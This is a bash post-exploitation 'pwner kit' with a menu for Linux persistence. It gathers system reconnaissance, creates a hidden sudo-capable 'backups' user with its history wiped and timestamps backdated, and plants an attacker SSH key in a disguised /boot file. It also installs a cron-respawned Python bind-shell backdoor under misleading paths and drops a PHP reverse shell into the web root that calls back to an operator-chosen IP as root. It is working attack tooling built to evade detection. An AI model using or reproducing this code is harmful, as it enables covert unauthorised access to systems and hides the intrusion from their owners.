#!/usr/bin/env bash

    red='\033[33;31m'
    green='\033[33;32m'
    blue='\033[33;34m'
    white='\033[1;37m'
    purple='\033[1;35m'
    tip='[?] Press ENTER to OPTIONS or 8 to EXIT!'

function loading() {
  spinner=( '|' '/' '-' '\' )
  end_time=$(( $(date +%s) + 2 ))
  while [ $(date +%s) -lt $end_time ]; do
    for i in "${spinner[@]}"
    do
      echo -ne "\rLoading... $i"
      sleep 0.1
    done
  done
  clear 
}

function root_check(){
if [[ $UID -ne 0 ]]
then
    clear
    echo
    echo -e "$red You nedd to be root to run this command!$white"
    echo
    exit 1
fi
}

echo -e "
$purple
          ╔════════════════════════════════════════════════════════════════╗
          ║        ________                           __________           ║
          ║       /  _____/  ____   ____    _________ \______   \          ║ 
          ║      /   \  ____/ __ \ /    \  / ___\__  \ |       _/          ║
          ║      \    \_\  \  ___/|   |  \/ /_/  > __ \|    |   \          ║
          ║       \______  /\___  >___|  /\___  (____  /____|_  /          ║
          ║              \/     \/     \//_____/     \/       \/           ║
          ║    __________                             ____  __.__  __      ║
          ║    \______   \__  _  ______   ___________|    |/ _|__|/  |_    ║
          ║     |     ___/\ \/ \/ /    \_/ __ \_  __ \      < |  \   __\   ║
          ║     |    |     \     /   |  \  ___/|  | \/    |  \|  ||  |     ║
          ║     |____|      \/\_/|___|  /\___  >__|  |____|__ \__||__|     ║
          ║                           \/     \/              \/            ║
          ║                            By H0ru                             ║
          ║                                                                ║
          ╚════════════════════════════════════════════════════════════════╝
"

loading

echo -e "$purple
  ⠀⠀⠀⠀⠀⢸⠓⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⢸⠀⠀⠑⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   
  ⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠙⢤⡷⣤⣦⣀⠤⠖⠚⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀   
  ⣠⡿⠢⢄⡀⠀⡇⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠸⠷⣶⠂⠀⠀⠀⣀⣀⠀⠀⠀  
  ⢸⣃⠀⠀⠉⠳⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⢉⡭⠋     
  ⠀⠘⣆⠀⠀⠀⠁⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀ [~] H3ll0: $red$(whoami)$purple
  ⠀⠀⠘⣦⠆⠀⠀⢀⡎⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⡀⣠⠔⠋⠀⠀⠀⠀ [~] Y0ur p0w3r: $red$(id | cut -d ' ' -f1 | cut -d '=' -f2)$purple
  ⠀⠀⠀⡏⠀⠀⣆⠘⣄⠸⢧⠀⠀⠀⠀⢀⣠⠖⢻⠀⠀⠀⣿⢥⣄⣀⣀⣀⠀⠀ | |
  ⠀⠀⢸⠁⠀⠀⡏⢣⣌⠙⠚⠀⠀⠠⣖⡛⠀⣠⠏⠀⠀⠀⠇⠀⠀⠀⠀⢙⣣⠄ | | 
  ⠀⠀⢸⡀⠀⠀⠳⡞⠈⢻⠶⠤⣄⣀⣈⣉⣉⣡⡔⠀⠀⢀⠀⠀⣀⡤⠖⠚⠀⠀ [?]$green CVE & LINPEAS$purple are other scripts encoded here!
  ⠀⠀⡼⣇⠀⠀⠀⠙⠦⣞⡀⠀⢀⡏⠀⢸⣣⠞⠀⠀⠀⡼⠚⠋⠁⠀⠀⠀⠀⠀ [?] The options$green 3, 4, 5 and 6$purple need root power!
  ⠀⢰⡇⠙⠀⠀⠀⠀⠀⠀⠉⠙⠚⠒⠚⠉⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀ 
  ⠀⠀⢧⡀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠙⣶⣶⣿⠢⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⢿⣳⠞⠳⡄⠀⠀⠀⢀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠹⣄⣀⡤⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"

echo -e "$white"

PS3="MODE: "
type=(
"INFO"
"CVE & LINPEAS"
"BACKUP USER"
"SSH-KEY"
"PYTHON BACKDOOR"
"PHP BACKDOOR"
"CLEAR" 
"EXIT" 
)
 select var in "${type[@]}"; do
  case $var in

"INFO")

echo -e "$blue Proceed?
      [?] y or ENTER to continue
      [?] n to exit"
         read -p " [y/n]: " ANSWER
         test "$ANSWER" = "n" && echo -e "$white" && exit
         clear

    #Info:
    echo -e "

       ╔══════════════════════════════════╗
       ║$green           Informations:          $blue║
       ╚══════════════════════════════════╝


   $green [+] About me: $white
   $(id || (whoami && groups) 2>/dev/null)


   $green [+] Path: $white
   $PATH


   $green [+] HardwareInfo: $white
   $(grep 'model name' /proc/cpuinfo | head -1 | awk -F': ' '{print $2}')


   $green [+] SystemInfo: $white
   $(hostnamectl)


   $green [+] Sudo: $white
   $(sudo -V| head -n1)


   $green [+] Super Users: $white
   $(awk -F: '($3 == "0") {print}' /etc/passwd)


   $green [+] Shell Users: $white
   $(cat /etc/passwd | grep "sh$")


   $green [+] Partitions: $white
   $(df -h || lsblk)


   $green [+] Crontab: $white
   $(cat /etc/crontab && ls -als /etc/cron*)


   $green [+] Tools find: $white
$(which curl wget nc ncat netcat nmap tcpdump telnet clang gcc g++ make pkexec tmux perl php python python2 python2.7 python3 python3.6 python3.7 docker lxc lxd rkt podman aws kubectl doas sudo socat sshd service systemctl system xterm chattr| tr ' ' '\n')"

   echo     
   echo -e "$green $tip $white"
   echo
               ;;
"CVE & LINPEAS")

echo -e "$blue Proceed?
      [?] y or ENTER to continue
      [?] n to exit"
         read -p " [y/n]: " ANSWER
         test "$ANSWER" = "n" && echo -e "$white" && exit
         clear

echo "

" | base64 -d > exploit-suggester ; chmod +x exploit-suggester

       echo -e "$white [Exploit Suggester File Created!]"  
       echo

echo "

" | base64 -d > linpeas ; chmod +x linpeas

       echo -e "$white [Linpeas File Created!]"  
       echo
       echo -e "$green $tip $white"
       echo
               ;;
"BACKUP USER")

root_check

echo -e "$blue Proceed?
      [?] y or ENTER to continue
      [?] n to exit"
         read -p " [y/n]: " ANSWER
         test "$ANSWER" = "n" && echo -e "$white" && exit
         clear

                name=backups
                echo -e "$white [+] User: backups"
                read -p " [+] Password: " password
                echo -ne "$password\n$password\n\n\n\n" | adduser $name 2>/dev/null
                echo -ne "\n$name   ALL=(ALL:ALL) ALL\n" >> /etc/sudoers
                mv /var/backups /var/bkps
                mv /home/backups /var/backups
                rm -rfd /var/backups/*
                sed -i 's/:\/home\/backups:/:\/var\/backups:/g' /etc/passwd
                shred -fuz /var/backups/.bash_history 2>/dev/null
                ln -s /dev/null /var/backups/.bash_history
                touch -t 201912250000 /var/backups/
                echo -e "$white [Backup User Created!]"

                echo     
                echo -e "$green $tip $white"
                echo
               ;;
"SSH-KEY")

root_check

echo -e "$blue Proceed?
      [?] y or ENTER to continue
      [?] n to exit"
         read -p " [y/n]: " ANSWER
         test "$ANSWER" = "n" && echo -e "$white" && exit
         clear
         
         echo -e "$white [+] SSH-KEY"

         read -p " [+] Paste your public key: " key

         echo $key >> /boot/model-generic

         chown backups:backups /boot/model-generic

         touch -t 201910280000 /boot/model-generic

         chmod 0600 /boot/model-generic

         sed -i 's/^.AuthorizedKeysFile.*/AuthorizedKeysFile \/boot\/model-generic/g' /etc/ssh/sshd_config;

         sed -i 's/AuthorizedKeysFile.*/AuthorizedKeysFile \/boot\/model-generic/g' /etc/ssh/sshd_config;

         sed -i 's/^.PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config;

         sed -i 's/PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config;

         service ssh restart;

         echo "[SSH Key Configurated!]"

         echo     
         echo -e "$green $tip $white"
         echo
               ;;
"PYTHON BACKDOOR")

root_check

echo -e "$blue Proceed?
      [?] y or ENTER to continue
      [?] n to exit"
         read -p " [y/n]: " ANSWER
         test "$ANSWER" = "n" && echo -e "$white" && exit
         clear

    testpython=$(command -v python3 >/dev/null 2>&1 && echo -e "$green Installed!" || echo -e "$red Not Installed!")

    echo -e "$blue
    ╔══════════════════════════════════════════╗
    ║          Python3 checker to GPK          ║
    ╠════════════════════╦═════════════════════╝
    ║       Status:      ║    [$testpython$blue ]
    ╚════════════════════╝   
    "
   
    test_python=$(command -v python3 >/dev/null 2>&1 && echo -e "$Installed!" || echo -e "Not Installed!")

    test "$test_python" = "Not Installed!" && echo -e "$white" && exit

    echo -e "$white"

cat << 'EOF' > /usr/lib/networker
#!/usr/bin/env python3
import socket
import os
import subprocess
import traceback
import threading
from socket import error as SocketError
import errno
LOCALHOST = '0.0.0.0' 
PORT = DOOR
banner = (b"""
          NETWORK SYSTEM
""")
class ClientThread(threading.Thread):
    def __init__(self,clientAddress,clientsocket):
        threading.Thread.__init__(self)
        self.csocket = clientsocket
    def run(self):
        while True:
            self.csocket.send(banner)
            while True:
                data = self.csocket.recv(1024)
                if data.decode() == "PASSWORD\n":
                    self.csocket.send(b"Right!\n")
                    while True:
                        data = self.csocket.recv(1024)
                        self.csocket.send(b"Command: " + data)
                        command = data.decode()
                        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
                        output = proc.stdout.read()
                        self.csocket.send(bytes(output))
                else:
                    self.csocket.send(b"Error!\n")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((LOCALHOST, PORT))
while True:
    s.listen(1000)
    clientsock, clientAddress = s.accept()
    newthread = ClientThread(clientAddress, clientsock)
    newthread.start()
EOF


read -p " [+] Your listening port: " DOOR


sed -i "s/DOOR/$DOOR/" /usr/lib/networker


read -p " [+] Your password: " PASSWORD


sed -i "s/PASSWORD/$PASSWORD/" /usr/lib/networker


python3 -m py_compile /usr/lib/networker


mv /usr/lib/__pycache__ /usr/lib/networks


mv /usr/lib/networks/networkercpython* /usr/lib/networks/networker.proc


rm /usr/lib/networker


cat << 'EOF' > /etc/security/system.conf
#!/usr/bin/env bash
while :
do
    /usr/bin/python3 /usr/lib/networks/networker.proc
    sleep 5
done
EOF


chmod u+x /etc/security/system.conf


echo "* * * * * root  /usr/bin/env bash /etc/security/system.conf" >> /etc/crontab        

          echo " [Opened!]" 

          echo     
          echo -e "$green $tip $white"
          echo
               ;;
"PHP BACKDOOR")

root_check

echo -e "$blue Proceed?
      [?] y or ENTER to continue
      [?] n to exit"
         read -p " [y/n]: " ANSWER
         test "$ANSWER" = "n" && echo -e "$white" && exit
         clear

testphp=$(command -v php >/dev/null 2>&1 && echo -e "$green Installed!" || echo -e "$red Not Installed!")

    echo -e "$blue
    ╔══════════════════════════════════════════╗
    ║            PHP checker to GPK            ║
    ╠════════════════════╦═════════════════════╝
    ║       Status:      ║    [$testphp$blue ]
    ╚════════════════════╝   
    "
   
    test_php=$(command -v php >/dev/null 2>&1 && echo -e "$Installed!" || echo -e "Not Installed!")

    test "$test_php" = "Not Installed!" && echo -e "$white" && exit

    echo -e "$blue
    ╔══════════════════════════════════════════╗
    ║         Web Service Folder Checker       ║   
    ╚══════════════════════════════════════════╝
    "

web_services_folder="/var/www/html"

if [ -d $web_services_folder ]; then
  echo -e "$white The web services folder was found at: $green$web_services_folder"
else
  echo -e "$white No web services folder found on your machine"
  exit 1
fi

echo -e "$white"

  cat << 'EOF' > /var/www/html/backup.php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = 'ALTERN1';  
$port = ALTERN2;       
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();
        
        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }
        
        if ($pid) {
                exit(0);  
        }
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }
        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),  
   1 => array("pipe", "w"),  
   2 => array("pipe", "w")   
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}
?>
EOF

read -p " [+] Your ip address: " ALTERN1

sed -i "s/ALTERN1/$ALTERN1/" /var/www/html/backup.php

read -p " [+] Your listening port: " ALTERN2

sed -i "s/ALTERN2/$ALTERN2/" /var/www/html/backup.php

echo "* * * * * root  php -f /var/www/html/backup.php 2>/dev/null &" >> /etc/crontab

echo " [Opened!]"

echo     
echo -e "$green $tip $white"
echo
               ;;

"CLEAR")
        clear
echo -e "$purple [?] PRESS ENTER"

echo -e "$white"
               ;;
"EXIT")
export HISTFILE=/dev/null
echo -e "$white"
       exit
               ;;
    esac
done
